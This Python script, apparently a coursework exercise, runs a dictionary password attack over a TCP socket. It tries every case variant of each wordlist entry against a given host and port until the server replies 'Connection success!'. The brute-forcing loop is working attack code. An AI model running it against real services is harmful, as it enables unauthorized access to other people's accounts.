import socket
import sys
import itertools
from typing import TextIO


def password_gen():
    alphas = (chr(x) for x in range(ord('a'), ord('z') + 1))
    digits = (chr(x) for x in range(ord('0'), ord('9') + 1))
    blank = ['', ]
    full_list = itertools.chain(blank, alphas, digits)
    for l0, l1, l2 in itertools.product(full_list, repeat=3):
        yield l0 + l1 + l2


def dictionary_passw(file: TextIO):
    for line in file:
        yield line

def pass_vars(word):
    for var in itertools.product(*([letter.lower(), letter.upper()] if letter.isalpha() else [letter, letter] for letter in word.strip('\n'))):
        yield ("".join(var))

def test_pass():
    with open('/Users/andreytp/Downloads/passwords.txt', 'r') as f:
        for paswd in dictionary_passw(f):
            for message in set(pass_vars(paswd)):
                print(message)


def hacking(host: str, port: str):
    with socket.socket() as client_socket:
        client_socket.connect((host, int(port)))
        attempt = 0
        with open('/Users/andreytp/Downloads/passwords.txt', 'r') as f:
            for paswd in dictionary_passw(f):
                for message in set(pass_vars(paswd)):
                    client_socket.send(message.encode('utf8'))
                    response = client_socket.recv(1024).decode('utf8')
                    if 'Connection success!' in response:
                        print(message)
                        return
                    attempt += 1
            # print(f'Attempt {attempt} password: {message}, result:{response}')


if __name__ == '__main__':
    args = sys.argv
    if len(args) != 3:
        print(args)
        print("The script should be called with two arguments")
        exit(1)
    hacking(*args[1:])
    # test_pass()
